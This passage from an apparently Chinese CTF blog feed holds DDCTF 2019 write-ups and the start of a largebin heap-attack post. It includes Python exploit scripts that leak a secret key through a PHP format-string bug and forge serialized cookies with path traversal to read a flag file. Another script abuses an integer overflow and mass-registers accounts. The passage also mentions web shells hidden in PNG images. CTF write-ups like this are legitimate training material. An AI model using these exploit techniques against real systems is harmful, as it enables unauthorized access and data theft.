class="variable">$cookiedata</span>);</span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;cookie_expiration + <span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(</span><br><span class="line">            <span class="variable">$this</span>-&gt;cookie_name,</span><br><span class="line">            <span class="variable">$cookiedata</span>,</span><br><span class="line">            <span class="variable">$expire</span>,</span><br><span class="line">            <span class="variable">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="variable">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="variable">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$ddctf</span> = <span class="keyword">new</span> <span class="title class_">Session</span>();</span><br><span class="line"><span class="variable">$ddctf</span>-&gt;<span class="title function_ invoke__">index</span>();</span><br></pre></td></tr></table></figure></div>

<p>存在格式化字符串漏洞</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>])) &#123;</span><br><span class="line">           <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>],<span class="variable language_">$this</span>-&gt;eancrykey);</span><br><span class="line">           <span class="variable">$data</span> = <span class="string">&quot;Welcome my friend %s&quot;</span>;</span><br><span class="line">           <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">               <span class="variable">$data</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$data</span>,<span class="variable">$v</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>,<span class="string">&quot;Welcome&quot;</span>);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></div>

<p>将 nickname 设置为 %s 可以泄露出 key</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://117.51.158.44/app/Session.php&#x27;</span><br><span class="line">cookies = &#123;&#x27;ddctf_id&#x27;:&#x27;a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22ac6ff9a13dbdcd35416e41e7f53cd52f%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A15%3A%22219.218.130.133%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A78%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A66.0%29+Gecko%2F20100101+Firefox%2F66.0%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D728397b258b90c6231b124d3a492bb48&#x27;&#125;</span><br><span class="line">headers = &#123;&#x27;didictf_username&#x27;:&#x27;admin&#x27;, &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&#x27;&#125;</span><br><span class="line">data = &#123;&#x27;nickname&#x27;:&#x27;%s&#x27;&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">r = s.post(url,headers=headers,cookies=cookies,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php&quot;&#125;&#123;&quot;errMsg&quot;:&quot;Welcome&quot;,&quot;data&quot;:&quot;Welcome my friend EzblrbNS&quot;&#125;&#123;&quot;errMsg&quot;:&quot;sucess&quot;,&quot;data&quot;:&quot;DiDI Welcome you Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko\/20100101 Firefox\/66.0&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>得到 key：EzblrbNS</p>
<p>然后利用 Application 中析构函数读文件的能力读取 flag ，构造一个满足要求的 cookie。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://117.51.158.44/app/Session.php&#x27;</span><br><span class="line">cookies = &#123;&#x27;ddctf_id&#x27;:&#x27;O%3a11%3a%22Application%22%3a1%3a%7bs%3a4%3a%22path%22%3bs%3a21%3a%22...%2f.%2fconfig%2fflag.txt%22%3b%7d5a014dbe49334e6dbb7326046950bee2&#x27;&#125;</span><br><span class="line">headers = &#123;&#x27;didictf_username&#x27;:&#x27;admin&#x27;, &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&#x27;&#125;</span><br><span class="line">data = &#123;&#x27;nickname&#x27;:&#x27;%s&#x27;&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.post(url,headers=headers,cookies=cookies,data=data)</span><br><span class="line">#r = s.post(url,headers=headers)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php&quot;&#125;&#123;&quot;errMsg&quot;:&quot;Congratulations&quot;,&quot;data&quot;:&quot;DDCTF&#123;ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>flag:   DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</p>
<h2 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h2><p>题目给出了很明确的提示，Shamir秘密分享方案，从 wiki 上面简单了解了一下原理，大概意思就是将一个秘密按照一定的算法分成 k 份(分给 k 个人)，并且制定了一个方案，大于等于 n 个人(n &lt; k) 可以将自己手中的秘密合并起来得到完整的秘密，但是小于 n 个人是无论如何都不能解出原始的秘密的。</p>
<p>plaid CTF 2012 有一题和本题很相似，脚本拿来修改一下</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xC53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7</span></span><br><span class="line">pairs = []</span><br><span class="line">pairs += [(<span class="number">1</span>, <span class="number">4470518445270315294253865008865808469591813925340527555511144870776210371333461962571100355988938503377974496098260851399298392762768768321710499151173494</span>)]</span><br><span class="line">pairs += [(<span class="number">2</span>, <span class="number">8941036890540630588507730017731616939183627850681055111022287516566391215447315659339930733926206804504075152291658988777248041197116052099144174634617967</span>)]</span><br><span class="line"><span class="comment"># pairs += [(1, 0x30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A)]</span></span><br><span class="line"><span class="comment"># pairs += [(2, 0x1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7)]</span></span><br><span class="line"><span class="comment"># pairs += [(4, 0x1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC)]</span></span><br><span class="line"><span class="comment"># pairs += [(3, 0x300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA)]</span></span><br><span class="line"><span class="comment"># pairs += [(4, 0x1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9)]</span></span><br><span class="line"><span class="comment"># pairs += [(5, 0x9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45)]</span></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, pair <span class="keyword">in</span> <span class="built_in">enumerate</span>(pairs):</span><br><span class="line">    x, y = pair</span><br><span class="line">    top = <span class="number">1</span></span><br><span class="line">    bottom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j, pair <span class="keyword">in</span> <span class="built_in">enumerate</span>(pairs):</span><br><span class="line">        <span class="keyword">if</span> j == i:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        xj, yj = pair</span><br><span class="line">        top = (top * (-xj)) % p</span><br><span class="line">        bottom = (bottom * (x - xj)) % p</span><br><span class="line">    res += (y * top * invmod(bottom, p)) % p</span><br><span class="line">    res %= p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line"><span class="built_in">print</span> n2s(res)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">pairs = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4470518445270315294253865008865808469591813925340527555511144870776210371333461962571100355988938503377974496098260851399298392762768768321710499151173494</span></span><br><span class="line"><span class="comment"># 8941036890540630588507730017731616939183627850681055111022287516566391215447315659339930733926206804504075152291658988777248041197116052099144174634617967</span></span><br><span class="line"><span class="comment"># DDCTF&#123;5x3ROxvqF2SJrDdVy73IADA04PxdLLab&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>flag:   DDCTF{5x3ROxvqF2SJrDdVy73IADA04PxdLLab}</p>
<p>需要注意的是题目中提到了两个组织，我们需要对这两个组织分别解密，例如组织一的密文为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[(1,0x30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A)]</span><br><span class="line">[(2,0x1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7)]</span><br><span class="line">[(4,0x1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC)]</span><br></pre></td></tr></table></figure></div>

<p>解密得到</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">4470518445270315294253865008865808469591813925340527555511144870776210371333461962571100355988938503377974496098260851399298392762768768321710499151173494</span><br></pre></td></tr></table></figure></div>

<p>以此类推，得到组织二</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">8941036890540630588507730017731616939183627850681055111022287516566391215447315659339930733926206804504075152291658988777248041197116052099144174634617967</span><br></pre></td></tr></table></figure></div>

<p>然后利用密文</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pairs += [(1, 4470518445270315294253865008865808469591813925340527555511144870776210371333461962571100355988938503377974496098260851399298392762768768321710499151173494)]</span><br><span class="line">pairs += [(2, 8941036890540630588507730017731616939183627850681055111022287516566391215447315659339930733926206804504075152291658988777248041197116052099144174634617967)]</span><br></pre></td></tr></table></figure></div>

<p>才能计算出 flag。</p>
<h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>要求上传一个图片，并且里面要包含 phpinfo() 字符串，之前看到比较类似的题目，用脚本将字符串藏在图片中就可以。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br></pre></td></tr></table></figure></div>

<p>参考链接</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.cnblogs.com/airobot/p/5303762.html</span><br></pre></td></tr></table></figure></div>

<h2 id="Have-Fun"><a href="#Have-Fun" class="headerlink" title="Have Fun"></a>Have Fun</h2><p>JEB 分析，JAVA 层的代码好像经过混淆，大部分变量名和函数名都被替换成了特殊字符。找到了貌似是主要函数的位置</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">key</span><span class="params">(String flag)</span> &#123;</span><br><span class="line">        xq v5;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="number">24</span>;</span><br><span class="line">        <span class="type">byte</span>[] v0_1 = <span class="keyword">new</span> <span class="title class_">byte</span>[v0];</span><br><span class="line">        <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">23</span>;</span><br><span class="line">        <span class="type">byte</span>[] v1_1 = <span class="keyword">new</span> <span class="title class_">byte</span>[v1];</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">v2</span> <span class="operator">=</span> TextUtils.isEmpty(((CharSequence)flag));</span><br><span class="line">        <span class="keyword">if</span>(v2) &#123;</span><br><span class="line">            flag = MainActivity.dec_string(v0_1);</span><br><span class="line">            <span class="built_in">this</span>.(flag);</span><br><span class="line">            v5 = <span class="built_in">this</span>.input_flag_here;</span><br><span class="line">            v5.setEnabled(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        flag = <span class="built_in">this</span>.enc(flag);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">v5_1</span> <span class="operator">=</span> JniUtils.helloDidi(flag);</span><br><span class="line">        flag = v5_1 ? MainActivity.dec_string(v1_1) : MainActivity.dec_string(v0_1);</span><br><span class="line">        <span class="built_in">this</span>.(flag);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.input_flag_here != <span class="literal">null</span>) &#123;</span><br><span class="line">            v5 = <span class="built_in">this</span>.input_flag_here;</span><br><span class="line">            v5.setEnabled(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>输入 flag 之后传入 enc 函数，这个函数又调用了 assert 中 dex 的代码。</p>
<p>(程序中的一些字符串经过加密，解密函数由于未知原因不能反编译，我编写了以下脚本对字符串解密)</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">46</span>, -<span class="number">100</span>, <span class="number">13</span>, -<span class="number">127</span>, -<span class="number">18</span>, <span class="number">105</span>]</span><br><span class="line">t = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="built_in">len</span>(s) - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">    temp = (s[i] - s[i - <span class="number">1</span>] - <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line">    t += <span class="built_in">chr</span>(temp)</span><br><span class="line">t += <span class="built_in">chr</span>(s[<span class="number">0</span>] ^ <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(t[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure></div>

<p>最后会传入 so 中进行对比验证，密文为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@n|ixihPIppqws</span><br></pre></td></tr></table></figure></div>

<p>但是按照 dex 中的逻辑往回推算得到的字符串为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;huao_]D&lt;baafa</span><br></pre></td></tr></table></figure></div>

<p>然而这个东西输入程序不正确。</p>
<p>静态分析到这里就走不下去了，于是采用动态分析的办法，用 android studio + xposed 拦截加密结果</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;com.didictf_2019.didicft2019_mobile&quot;</span>.equals(loadPackageParam.packageName)) &#123;</span><br><span class="line">   XposedHelpers.findAndHookMethod(<span class="string">&quot;com.didictf_2019.didicft2019_mobile.JniUtils&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;helloDidi&quot;</span>,String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line"></span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">           <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">           Log.e(<span class="string">&quot;&gt;&quot;</span>,(String) param.args[<span class="number">0</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>例如，输入样例为 14 个 ‘a’，拦截到的加密结果为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ihkjmlonqpsrut</span><br></pre></td></tr></table></figure></div>

<p>接着输入 14 个 ‘b’，得到解密结果</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jkhinolmrspqvw</span><br></pre></td></tr></table></figure></div>

<p>密文很有规律，尝试将它们分别与原文异或发现加密算法很简单，按位与 [8,9,10,11,12,13,14,15,16,17,18,19,20,21] 进行异或运算。</p>
<p>将原始密文异或上面的列表即可得到正确 flag。</p>
<p>flag： Hgvbtdf_Yabbcf</p>
<h2 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h2><p>测试整数溢出，买票的时候抓包，修改票价为 4294967296，然后去支付页面购买。</p>
<p>买票之后要通过 id 和 ticket 移除对手，自己重新注册了一个账号可以成功移除，那么编写脚本批量注册账号移除对手就可以了(由于 id 的原因，移除的对手越多，移除的速度就越慢，所以需要多开几个脚本同时执行)。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">id</span>=[]</span><br><span class="line">ticket=[]</span><br><span class="line">bill_id_str = re.<span class="built_in">compile</span>(<span class="string">&#x27;bill_id&quot;:&quot;([\w-]+)&quot;&#x27;</span>)</span><br><span class="line">ticket_str = re.<span class="built_in">compile</span>(<span class="string">&#x27;&#123;&quot;id&quot;:([\d]+),&quot;ticket&quot;:&quot;([\w]+)&quot;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">id</span>,ticket</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    name=<span class="string">&quot;catalpa&quot;</span>+<span class="built_in">str</span>(name)</span><br><span class="line">    s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/register?name=&quot;</span>+name+<span class="string">&quot;&amp;password=12345678&quot;</span>).text</span><br><span class="line">    s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/login?name=&quot;</span>+name+<span class="string">&quot;&amp;password=12345678&quot;</span>).text</span><br><span class="line">    bill_id= bill_id_str.findall(s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot;</span>).text)[<span class="number">0</span>]</span><br><span class="line">    s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&quot;</span>+bill_id)</span><br><span class="line">    ans= ticket_str.findall(s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/search_ticket&quot;</span>).text)</span><br><span class="line">    url = <span class="string">&quot;http://117.51.147.155:5050/ctf/api/remove_robot?ticket=&quot;</span>+ans[<span class="number">0</span>][<span class="number">1</span>]+<span class="string">&quot;&amp;id=&quot;</span>+ans[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    cookies = &#123;<span class="string">&quot;user_name&quot;</span>: <span class="string">&quot;fuck123123&quot;</span>, <span class="string">&quot;REVEL_SESSION&quot;</span>: <span class="string">&quot;2a98bec870dd806523ce9dcd3e8ebd14&quot;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://117.51.147.155:5050/index.html&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    <span class="built_in">id</span>.append(ans[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    ticket.append(ans[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>,<span class="number">20000</span>):</span><br><span class="line">    exp(<span class="string">&quot;catalpa&quot;</span> + i)</span><br></pre></td></tr></table></figure></div>

<p>flag:   DDCTF{chiken_dinner_hyMCX[n47Fx)}</p>
<h2 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h2><p>题目名字可能要表达 mult xor，即异或加密。</p>
<p>直接用 featherduster  autopwn  一把梭。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cryptanalysis of the Enigma ciphering system enabled the western Allies in World War II to read substantial amounts of Morse-coded radio communications of the Axis powers that had been enciphered using Enigma machines. This yielded military intelligence which, along with that from other decrypted Axis radio and teleprinter transmissions, was given the codename Ultra. This was considered by western Supreme Allied Commander Dwight D. Eisenhower to have been &quot;decisive&quot; to the Allied victory.</span><br><span class="line"></span><br><span class="line">The Enigma machines were a family of portable cipher machines with rotor scramblers. Good operating procedures, properly enforced, would have made the plugboard Enigma machine unbreakable. However, most of the German military forces, secret services and civilian agencies that used Enigma employed poor operating procedures, and it was these poor procedures that allowed the Enigma machines to be reverse-engineered and the ciphers to be read.</span><br><span class="line"></span><br><span class="line">The German plugboard-equipped Enigma became Nazi Germany&#x27;s principal crypto-system. It was broken by the Polish General Staff&#x27;s Cipher Bureau in December 1932, with the aid of French-supplied intelligence material obtained from a German spy. A month before the outbreak of World War II, at a conference held near Warsaw, the Polish Cipher Bureau shared its Enigma-breaking techniques and technology with the French and British. During the German invasion of Poland, core Polish Cipher Bureau personnel were evacuated, via Romania, to France where they established the PC Bruno signals intelligence station with French facilities support. Successful cooperation among the Poles, the French, and the British at Bletchley Park continued until June 1940, when France surrendered to the Germans.</span><br><span class="line"></span><br><span class="line">From this beginning, the British Government Code and Cypher School (GC&amp;CS) at Bletchley Park built up an extensive cryptanalytic capability. Initially, the decryption was mainly of Luftwaffe (German air force) and a few Heer (German army) messages, as the Kriegsmarine (German navy) employed much more secure procedures for using Enigma. Alan Turing, a Cambridge University mathematician and logician, provided much of the original thinking that led to the design of the cryptanalytical bombe machines that were instrumental in eventually breaking the naval Enigma. However, the Kriegsmarine introduced an Enigma version with a fourth rotor for its U-boats, resulting in a prolonged period when these messages could not be decrypted. With the capture of relevant cipher keys and the use of much faster US Navy bombes, regular, rapid reading of U-boat messages resumed.</span><br><span class="line"></span><br><span class="line">The flag is: DDCTF&#123;07b1b46d1db28843d1fd76889fea9b36&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h2><p>拿到题目分析图片，用 stegsolve 在低通道取出了一串 BASE64 编码的数据</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">7SsQWmZ524i/yVWoMeAIJA==</span><br></pre></td></tr></table></figure></div>

<p>用 BASE64 解不出来，猜想应该是还有另外的加密手段，于是用了各种工具测试图片，没有什么结果。</p>
<p>后续比赛放出最后一个提示，才知道密钥可能藏在内容里面，而不是隐写技巧。</p>
<p>仔细观察图片发现 2 号线魏公村点点颜色比较深，用字符串 weigongcun 作为密钥在线解密得到 flag</p>
<p>DDCTF{Q*2!x@B0}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Largebin attack</title>
    <url>/2019/04/18/largebin_attack/</url>
    <content><![CDATA[<p>最近打了西湖论剑预选赛，比赛中一道 pwn 题的利用手法是 largebin attack。largebin attack 在 CTF 比赛中的出现频率比较低，但是一旦出现肯定就是难度较高的题目。今天就来探究一下关于 largebin attack 的相关攻击手段。</p>
<span id="more"></span>

<h2 id="西湖论剑-2019-Storm-note"><a href="#西湖论剑-2019-Storm-note" class="headerlink" title="西湖论剑 2019 Storm_note"></a>西湖论剑 2019 Storm_note</h2><p>这道题不是原创，而是由 0ctf 的 heapstorm2 修改而来，稍稍降低了难度。所有保护全开。</p>
<p>首先分析题目代码，程序实现了一个常见的 note 管理系统，可以添加，修改和删除 note，另外还有一个 backdoor 函数。</p>
<p>主函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_proc();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">666</span> )</span><br><span class="line">        backdoor();</span><br><span class="line">LABEL_15:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      alloc_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      edit_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>backdoor:</p>
